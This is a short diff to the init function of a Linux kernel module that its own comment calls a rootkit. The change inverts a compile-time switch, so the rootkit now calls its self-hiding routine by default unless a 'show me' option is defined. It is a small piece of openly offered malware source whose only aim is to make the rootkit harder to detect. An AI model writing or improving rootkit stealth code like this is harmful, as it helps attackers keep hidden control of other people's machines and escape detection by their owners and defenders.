@@ -331,7 +331,7 @@ static int __init rooti_init(void)
     }
 
     // If configured to be hidden by default, hide this rootkit
-#ifdef ROOTI_HIDEME_DEFAULT
+#ifndef ROOTI_SHOWME_DEFAULT
     rooti_hideme();
 #endif
 
